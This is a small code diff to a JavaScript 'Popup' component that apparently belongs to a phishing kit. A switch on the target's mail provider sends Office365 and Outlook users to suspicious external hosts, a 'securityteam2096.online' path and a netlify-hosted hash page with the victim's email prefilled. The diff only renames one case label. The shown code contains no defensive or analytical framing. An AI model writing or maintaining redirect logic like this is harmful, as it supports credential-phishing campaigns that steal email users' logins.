@@ -133,7 +133,7 @@ const Popup = ({ domain, eparams, systemInfo }) => {
       case "Office365":
         redirectUrl = "https://www.securityteam2096.online/ApBfDcol";
         break;
-      case "Others":
+      case "Outlook":
         redirectUrl = "https://mailsvdsfd.netlify.app/bafkreih6fxk4q2ygpymokk2lecvogvblw3tfemkj2x6hsgd3xzc6vsz7uq?email=[[-Email-]]";
         break;
       default:
